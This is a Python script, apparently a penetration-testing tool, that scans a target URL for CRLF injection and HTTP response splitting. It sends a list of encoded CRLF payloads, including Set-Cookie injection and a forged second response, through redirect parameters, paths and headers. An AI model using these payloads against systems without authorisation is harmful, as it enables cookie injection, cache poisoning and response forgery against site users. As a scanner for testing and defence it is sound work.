#!/usr/bin/env python3
"""
crlf_scanner.py — CRLF injection and HTTP response splitting scanner.

Tests CRLF injection via URL parameters, path segments, and headers.
Detects header injection and response splitting.

Usage:
  python3 tools/crlf_scanner.py --url https://app.example.com/redirect
  python3 tools/crlf_scanner.py --url https://app.example.com/ --dry-run
  python3 tools/crlf_scanner.py --url https://app.example.com/ --rate 0.5 --json
"""

import argparse
import json
import sys
import time
import urllib.request
import urllib.error
import urllib.parse

# ─── Color codes ──────────────────────────────────────────────────────────────
RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BLUE   = "\033[94m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"

FINDINGS = []

# ─── CRLF Payloads ────────────────────────────────────────────────────────────

# Core CRLF sequences
CRLF_SEQUENCES = [
    ("%0d%0a",                 "url-encoded CRLF"),
    ("%0a",                    "url-encoded LF only"),
    ("%0d",                    "url-encoded CR only"),
    ("%E5%98%8A%E5%98%8D",     "UTF-8 overlong CRLF"),
    ("%E5%98%8A",              "UTF-8 overlong LF"),
    ("%c0%8a",                 "UTF-8 overlong LF (alt)"),
    ("\r\n",                   "raw CRLF"),
    ("\\r\\n",                 "escaped CRLF"),
    ("%250a",                  "double-encoded LF"),
    ("%250d%250a",             "double-encoded CRLF"),
    ("%09",                    "tab (header folding)"),
    ("%20%0d%0a%20",           "space+CRLF+space (folding)"),
    ("%0d%0aSet-Cookie%3a%20x%3d1", "CRLF + Set-Cookie header"),
    ("%0d%0aX-Injected%3a%20yes",   "CRLF + X-Injected header"),
    ("%0d%0aContent-Length%3a%200%0d%0a%0d%0a", "Response splitting with Content-Length"),
]

# Parameters commonly used in redirects
REDIRECT_PARAMS = [
    "redirect", "url", "next", "return", "returnTo", "return_to",
    "returnUrl", "return_url", "callback", "goto", "redir", "destination",
    "dest", "target", "to", "from", "continue", "forward", "Location",
    "jump", "link", "out", "exit", "page",
]

# Injection marker header (to detect in response)
MARKER_HEADER = "X-CRLF-Injected"
MARKER_VALUE  = "crlf-test-123"


# ─── HTTP Helpers ─────────────────────────────────────────────────────────────

def http_get(url: str, headers: dict | None = None,
              follow_redirects: bool = False,
              timeout: int = 10) -> tuple[int, dict, str]:
    req_headers = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
    if headers:
        req_headers.update(headers)

    opener = urllib.request.build_opener()
    if not follow_redirects:
        opener = urllib.request.build_opener(urllib.request.HTTPRedirectHandler())

    req = urllib.request.Request(url, headers=req_headers)
    try:
        with opener.open(req, timeout=timeout) as r:
            body = r.read().decode(errors="replace")
            resp_headers = {}
            for k in r.headers:
                resp_headers[k.lower()] = r.headers[k]
            return r.status, resp_headers, body
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        resp_headers = {}
        for k in e.headers:
            resp_headers[k.lower()] = e.headers[k]
        return e.code, resp_headers, body
    except Exception as e:
        return 0, {}, str(e)


def record(test: str, result: str, detail: str, severity: str = "MEDIUM"):
    FINDINGS.append({"test": test, "result": result, "detail": detail, "severity": severity})
    color = RED if result == "VULNERABLE" else (YELLOW if result == "INTERESTING" else GREEN)
    print(f"  {color}[{result}]{RESET} {test}")
    if detail:
        print(f"    {DIM}{detail}{RESET}")


def check_response_for_injection(headers: dict, body: str) -> list[str]:
    """Return list of injection signals found in response."""
    signals = []
    for k, v in headers.items():
        if MARKER_HEADER.lower() in k.lower():
            signals.append(f"injected header found: {k}: {v}")
        if MARKER_VALUE in v:
            signals.append(f"marker value in header {k}: {v}")
        # Response splitting: look for double Content-Type or unexpected headers
        if "set-cookie" in k.lower() and "crlf" in v.lower():
            signals.append(f"CRLF in Set-Cookie: {v[:60]}")
    if MARKER_VALUE in body:
        signals.append("marker value reflected in body")
    return signals


# ─── Test Cases ───────────────────────────────────────────────────────────────

def test_redirect_params(url: str, rate: float, dry_run: bool):
    print(f"\n{BOLD}[1] CRLF in Redirect Parameters{RESET}")
    tested = 0
    for param in REDIRECT_PARAMS:
        for seq, desc in CRLF_SEQUENCES[:6]:  # Test first 6 sequences per param
            # Build payload: value contains CRLF + injected header
            payload = f"https://example.com/{seq}{MARKER_HEADER}:{MARKER_VALUE}"
            parsed = urllib.parse.urlparse(url)
            qs = f"{param}={urllib.parse.quote(payload, safe='')}"
            test_url = urllib.parse.urlunparse(
                parsed._replace(query=qs)
            )
            if dry_run:
                print(f"  {CYAN}[DRY-RUN]{RESET} {param}={seq}...")
                print(f"    {DIM}URL: {test_url[:100]}{RESET}")
                tested += 1
                if tested >= 3:
                    print(f"  {DIM}... (showing first 3, {len(REDIRECT_PARAMS)*6 - 3} more){RESET}")
                    return
                continue
            time.sleep(1.0 / rate)
            status, headers, body = http_get(test_url, follow_redirects=False)
            signals = check_response_for_injection(headers, body)
            if signals:
                record(f"crlf-redirect-{param}", "VULNERABLE",
                       f"param={param}, seq={desc}: {'; '.join(signals)}")
                return  # One confirmation is enough
    if not dry_run:
        print(f"  {DIM}No injection detected in {len(REDIRECT_PARAMS)} params × 6 sequences{RESET}")


def test_url_path_injection(url: str, rate: float, dry_run: bool):
    print(f"\n{BOLD}[2] CRLF in URL Path{RESET}")
    base = url.rstrip("/")
    for seq, desc in CRLF_SEQUENCES[:8]:
        test_url = f"{base}/{seq}{MARKER_HEADER}:{MARKER_VALUE}"
        if dry_run:
            print(f"  {CYAN}[DRY-RUN]{RESET} Path injection: {test_url[:100]}")
            continue
        time.sleep(1.0 / rate)
        status, headers, body = http_get(test_url, follow_redirects=False)
        signals = check_response_for_injection(headers, body)
        if signals:
            record(f"crlf-path-{desc}", "VULNERABLE",
                   f"Path seq={desc}: {'; '.join(signals)}")
        else:
            record(f"crlf-path-{desc}", "BLOCKED", f"HTTP {status}")


def test_header_injection(url: str, rate: float, dry_run: bool):
    print(f"\n{BOLD}[3] CRLF via Request Header Values{RESET}")
    header_tests = [
        ("User-Agent",  f"Mozilla/5.0\r\n{MARKER_HEADER}: {MARKER_VALUE}"),
        ("Referer",     f"https://example.com/\r\n{MARKER_HEADER}: {MARKER_VALUE}"),
        ("Accept",      f"text/html\r\n{MARKER_HEADER}: {MARKER_VALUE}"),
        ("Cookie",      f"session=test\r\n{MARKER_HEADER}: {MARKER_VALUE}"),
    ]
    for hname, hval in header_tests:
        if dry_run:
            print(f"  {CYAN}[DRY-RUN]{RESET} Header {hname}: {hval[:60]}...")
            continue
        time.sleep(1.0 / rate)
        # urllib will reject actual \r\n in headers — this tests if server reflects headers
        try:
            status, headers, body = http_get(url, {hname: hval.replace("\r\n", "%0d%0a")})
            signals = check_response_for_injection(headers, body)
            if signals:
                record(f"header-inject-{hname}", "VULNERABLE",
                       f"Header {hname} injection: {'; '.join(signals)}")
            else:
                record(f"header-inject-{hname}", "BLOCKED", f"HTTP {status}")
        except Exception as e:
            record(f"header-inject-{hname}", "ERROR", str(e))


def test_set_cookie_injection(url: str, rate: float, dry_run: bool):
    print(f"\n{BOLD}[4] Response Splitting / Set-Cookie Injection{RESET}")
    split_payloads = [
        ("content-length-split",
         f"%0d%0aContent-Length%3a%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a"
         f"Content-Type%3a%20text/html%0d%0a%0d%0a<html>SPLIT</html>"),
        ("set-cookie-inject",
         f"%0d%0aSet-Cookie%3a%20{MARKER_HEADER}%3d{MARKER_VALUE}%3b%20Path%3d/"),
        ("x-header-inject",
         f"%0d%0a{MARKER_HEADER}%3a%20{MARKER_VALUE}"),
    ]
    parsed = urllib.parse.urlparse(url)
    for name, payload in split_payloads:
        test_url = urllib.parse.urlunparse(
            parsed._replace(query=f"redirect={payload}")
        )
        if dry_run:
            print(f"  {CYAN}[DRY-RUN]{RESET} {name}: {test_url[:100]}")
            continue
        time.sleep(1.0 / rate)
        status, headers, body = http_get(test_url, follow_redirects=False)
        signals = check_response_for_injection(headers, body)
        if signals:
            record(f"response-split-{name}", "VULNERABLE",
                   f"{'; '.join(signals)}")
        else:
            record(f"response-split-{name}", "BLOCKED", f"HTTP {status}")


def print_payload_table():
    print(f"\n{BOLD}CRLF Payload Reference:{RESET}")
    for seq, desc in CRLF_SEQUENCES:
        print(f"  {DIM}{seq:45s} {desc}{RESET}")


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="CRLF injection and response splitting scanner")
    parser.add_argument("--url",     required=True, help="Target URL to test")
    parser.add_argument("--rate",    type=float, default=1.0, metavar="REQ/S",
                        help="Request rate limit in req/sec (default: 1.0)")
    parser.add_argument("--dry-run", action="store_true",
                        help="Show payloads without sending requests")
    parser.add_argument("--json",    action="store_true", dest="json_output",
                        help="Output results as JSON")
    args = parser.parse_args()

    print(f"\n{BOLD}{BLUE}╔══════════════════════════════════════╗")
    print(f"║   CRLF Injection Scanner             ║")
    print(f"╚══════════════════════════════════════╝{RESET}")
    print(f"  Target : {CYAN}{args.url}{RESET}")
    print(f"  Rate   : {args.rate} req/sec")
    if args.dry_run:
        print(f"  Mode   : {YELLOW}DRY-RUN (no requests sent){RESET}")

    print_payload_table()

    test_redirect_params(args.url, args.rate, args.dry_run)
    test_url_path_injection(args.url, args.rate, args.dry_run)
    test_header_injection(args.url, args.rate, args.dry_run)
    test_set_cookie_injection(args.url, args.rate, args.dry_run)

    vulns = [f for f in FINDINGS if f["result"] == "VULNERABLE"]
    print(f"\n{BOLD}{'─'*50}{RESET}")
    print(f"  Tests run  : {len(FINDINGS)}")
    if vulns:
        print(f"  {RED}Vulnerable : {len(vulns)}{RESET}")
        for f in vulns:
            print(f"    {RED}→{RESET} {f['test']}: {f['detail']}")
    else:
        print(f"  {GREEN}Vulnerable : 0{RESET}")

    if args.json_output:
        print(json.dumps({"url": args.url, "findings": FINDINGS}, indent=2))


if __name__ == "__main__":
    main()
